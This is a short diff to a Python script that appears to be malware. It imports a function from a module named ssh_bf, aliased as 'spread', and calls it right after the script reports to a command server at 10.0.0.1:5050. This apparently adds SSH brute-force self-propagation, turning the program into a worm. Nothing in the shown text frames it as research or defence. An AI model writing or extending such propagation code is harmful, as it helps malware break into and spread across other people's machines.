@@ -8,6 +8,7 @@ from os import path
 import requests
 import os
 from message import create_message
+from ssh_bf import main as spread
 
 SERVER="10.0.0.1"
 PORT="5050"
@@ -117,6 +118,8 @@ def main():
             print(f"Directory does not exist: {directory}")
 
     create_message(SERVER, PORT, id)
+
+    spread()
 
 
 main()
